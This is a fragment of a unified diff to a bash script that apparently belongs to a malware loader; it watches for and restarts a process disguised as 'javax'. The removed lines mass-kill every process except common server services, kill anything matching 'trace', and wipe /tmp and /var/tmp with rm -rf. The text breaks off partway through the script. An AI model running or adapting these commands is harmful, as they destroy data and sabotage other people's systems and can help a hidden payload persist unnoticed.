@@ -1,9 +1,5 @@
 #!/bin/bash
 function run(){
-    ps aux | grep -v grep | grep -v "java\|redis\|weblogic\|mongod\|mysql\|oracle\|tomcat\|grep\|postgres\|confluence\|awk\|aux\|sh" | awk '{print $2}' | xargs -I % kill -9 %
-    ps aux | grep "trace" | awk '{print $2}' | xargs -I % kill -9 %
-    rm -rf /tmp/*
-    rm -rf /var/tmp/*
     if pgrep -f "javax" > /dev/null; then run
     else
         if [ -f "javax" ]; then
